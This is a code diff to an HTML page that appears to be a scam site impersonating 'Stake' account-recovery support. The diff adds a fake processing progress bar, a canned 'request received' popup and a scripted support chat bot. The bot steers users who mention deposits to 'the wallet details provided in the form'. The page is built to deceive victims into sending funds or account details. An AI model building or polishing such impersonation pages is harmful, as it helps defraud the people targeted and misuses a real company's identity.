@@ -136,17 +136,23 @@
       pointer-events: none;
       user-select: none;
     }
+    /* Smaller theme button */
     .theme-toggle {
       position: fixed;
-      top: 20px;
-      right: 20px;
+      top: 15px;
+      right: 15px;
       background: #02dc05;
       color: #0f212e;
       border: none;
-      padding: 10px;
+      padding: 8px;
       border-radius: 50%;
-      font-size: 1.2rem;
+      font-size: 1rem;
       cursor: pointer;
+      width: 32px;
+      height: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
     .chat-icon {
       position: fixed;
@@ -164,16 +170,31 @@
       position: fixed;
       bottom: 80px;
       right: 20px;
-      width: 260px;
+      width: 280px;
       background: #1e2f3d;
       color: white;
       padding: 15px;
       border-radius: 12px;
       z-index: 1000;
       box-shadow: 0 0 10px #000;
+      max-height: 400px;
+      overflow-y: auto;
     }
     #chat-box p {
       margin-bottom: 10px;
+      font-size: 0.9rem;
+    }
+    #chat-box .user-message {
+      text-align: right;
+      color: #02dc05;
+    }
+    #chat-box .bot-message {
+      text-align: left;
+      color: #00ff9d;
+    }
+    #chat-box .timestamp {
+      font-size: 0.7rem;
+      color: #aaa;
     }
     #chat-input {
       width: 100%;
@@ -190,6 +211,21 @@
       border: none;
       border-radius: 6px;
       padding: 8px;
+    }
+    /* Progress bar */
+    #progress-bar {
+      width: 100%;
+      height: 5px;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
+      margin-top: 10px;
+    }
+    #progress {
+      width: 0;
+      height: 100%;
+      background: #02dc05;
+      transition: width 3s linear;
     }
     @keyframes fadeIn {
       from { opacity: 0; transform: scale(0.95) translate(-50%, -50%); }
@@ -257,7 +293,10 @@
     <button id="submitBtn" onclick="submitForm()" disabled>Submit</button>
   </div>
 
-  <div id="processing"><p>Processing your request...</p></div>
+  <div id="processing">
+    <p>Processing your request...</p>
+    <div id="progress-bar"><div id="progress"></div></div>
+  </div>
   <div id="popup">
     <p>YOUR ACCOUNT RECOVERY REQUEST HAS BEEN RECEIVED. WE HAVE FORWARDED YOUR QUERY TO THE STAKE TECHNICAL TEAM. YOUR STAKE ACCOUNT IS EXPECTED TO BE FULLY ACTIVE WITHIN 24 TO 72 HOURS.</p>
     <button onclick="location.reload()">OK</button>
@@ -265,7 +304,7 @@
 
   <div class="chat-icon" onclick="toggleChat()">💬</div>
   <div id="chat-box">
-    <p><strong>Stake Support:</strong> Hi! How can we assist you today?</p>
+    <p class="bot-message"><strong>Stake Support:</strong> Hello! How can we assist you today? <span class="timestamp"></span></p>
     <input type="text" id="chat-input" placeholder="Type your message..." />
     <button id="chat-send" onclick="sendMessage()">Send</button>
   </div>
@@ -351,12 +390,16 @@
     }
 
     function submitForm() {
-      document.getElementById('processing').style.display = 'block';
+      const processing = document.getElementById('processing');
+      const progress = document.getElementById('progress');
+      processing.style.display = 'block';
       document.getElementById('main-content').classList.add('blur');
+      progress.style.width = '100%'; // Progress bar completes in 3 seconds
       setTimeout(() => {
-        document.getElementById('processing').style.display = 'none';
+        processing.style.display = 'none';
         document.getElementById('popup').style.display = 'block';
-      }, 4000); // 4 second delay
+        progress.style.width = '0'; // Reset progress bar
+      }, 3000); // 3-second delay
     }
 
     function toggleTheme() {
@@ -367,14 +410,48 @@
     function toggleChat() {
       const box = document.getElementById('chat-box');
       box.style.display = box.style.display === 'block' ? 'none' : 'block';
+      if (box.style.display === 'block') {
+        updateTimestamps();
+        box.scrollTop = box.scrollHeight; // Auto-scroll to bottom
+      }
+    }
+
+    function updateTimestamps() {
+      const timestamps = document.querySelectorAll('.timestamp');
+      const now = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+      timestamps.forEach(ts => ts.textContent = now);
     }
 
     function sendMessage() {
       const input = document.getElementById('chat-input');
       const message = input.value.trim();
+      const chatBox = document.getElementById('chat-box');
+      const now = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
+
       if (message) {
-        alert("Thanks for your message! Our support team will respond shortly.");
+        // User message
+        const userMsg = document.createElement('p');
+        userMsg.className = 'user-message';
+        userMsg.innerHTML = `<strong>You:</strong> ${message} <span class="timestamp">${now}</span>`;
+        chatBox.appendChild(userMsg);
+
+        // Automated bot reply
+        setTimeout(() => {
+          let botReply = 'Thank you! Our support team will get back to you shortly.';
+          if (message.toLowerCase().includes('deposit')) {
+            botReply = 'Please use the wallet details provided in the form for deposits. Any other questions?';
+          } else if (message.toLowerCase().includes('account')) {
+            botReply = 'Complete the recovery form to restore your account. Let us know if you face any issues!';
+          }
+          const botMsg = document.createElement('p');
+          botMsg.className = 'bot-message';
+          botMsg.innerHTML = `<strong>Stake Support:</strong> ${botReply} <span class="timestamp">${now}</span>`;
+          chatBox.appendChild(botMsg);
+          chatBox.scrollTop = chatBox.scrollHeight; // Auto-scroll to bottom
+        }, 1000);
+
         input.value = '';
+        chatBox.scrollTop = chatBox.scrollHeight; // Auto-scroll to bottom
       }
     }
   </script>
